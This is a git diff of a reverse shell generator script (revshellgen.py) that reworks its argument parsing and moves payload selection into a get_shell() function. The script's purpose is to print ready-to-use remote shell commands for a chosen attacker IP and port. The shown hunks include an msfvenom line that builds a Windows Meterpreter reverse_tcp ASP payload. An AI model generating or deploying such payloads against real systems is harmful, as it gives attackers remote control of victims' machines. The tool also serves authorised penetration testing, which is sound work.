@@ -8,24 +8,22 @@ import argparse
 import re
 import socket
 import sys
-import time
 
 
 def parse_options():
     parser = argparse.ArgumentParser(
-        description='python revshellgen.py -i 127.0.0.1 -p 1234 -t bash')
+        description="python revshellgen.py -i 127.0.0.1 -p 1234 -t bash")
     parser.add_argument("-i",
                         "--ipaddr",
                         type=str,
-                        help="IP address or interface to connect back to",
-                        required=True)
+                        default="127.0.0.1",
+                        help="IP address or interface to connect back to")
     parser.add_argument("-p", "--port", type=int, default=4444, help="Port to connect back to")
     parser.add_argument("-t",
                         "--type",
                         type=str,
                         help="Type of reverse shell to generate",
-                        dest='shell_type',
-                        required=True)
+                        dest='shell_type')
     parser.add_argument("-l",
                         "--list",
                         action="store_true",
@@ -33,12 +31,16 @@ def parse_options():
                         dest='shell_list')
     args = parser.parse_args()
 
+    if (args.shell_type == None) ^ args.shell_list:
+        parser.print_help(sys.stderr)
+        sys.exit(1)
+
     return args
 
 
 def get_ip(ip_iface: str) -> str:
     # Check if valid ip address
-    if re.match(r'(^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$)', ip_iface):
+    if re.match(r"(^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$)", ip_iface):
         return ip_iface
 
     # Get ip address from interface
@@ -59,10 +61,7 @@ def get_ip(ip_iface: str) -> str:
         sys.exit(1)
 
 
-def main(args):
-    ipaddr = get_ip(args.ipaddr)
-    port = args.port
-
+def get_shell(ipaddr: str, port: int, shell_type: str) -> str:
     shells = {
         'asp':
         'msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%d -f asp > revshell.asp' %
@@ -173,13 +172,18 @@ def main(args):
         (ipaddr)
     }
 
-    if args.shell_type:
-        print("\n[+] Reverse shell command:\n")
-        print(shells[args.shell_type])
+    return shells[shell_type]
 
+
+def main(args: argparse.Namespace) -> None:
     if args.shell_list:
-        print("\n[+] Available shell types:\n")
-        print(shells.keys())
+        print("List of shells")  # TODO
+        return
+
+    ipaddr = get_ip(args.ipaddr)
+    port = args.port
+
+    print(get_shell(ipaddr, port, args.shell_type))
 
 
 if __name__ == "__main__":
